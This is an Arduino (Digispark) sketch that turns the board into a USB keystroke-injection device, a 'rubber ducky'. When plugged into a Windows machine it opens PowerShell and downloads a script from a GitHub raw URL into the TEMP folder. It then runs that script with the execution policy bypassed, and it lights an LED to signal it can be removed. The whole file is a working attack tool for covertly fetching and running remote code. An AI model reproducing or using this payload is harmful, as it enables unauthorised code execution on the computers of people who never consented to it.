#include "DigiKeyboard.h"
/* Init function */
void setup()
{
 //turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
 pinMode(1, OUTPUT); //LED on Model A
 digitalWrite(1, HIGH);
 DigiKeyboard.delay(500);
 digitalWrite(1, LOW);
 DigiKeyboard.sendKeyStroke(0);

 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(100);
 DigiKeyboard.println("powershell");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(100);
 DigiKeyboard.println("cd $env:TEMP ");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(100);
 DigiKeyboard.println("echo (wget 'https://raw.githubusercontent.com/mbauer599/rubberduckyrun/master/run').content > b.ps1");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(50);
 DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.println("exit");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(100);
 digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}
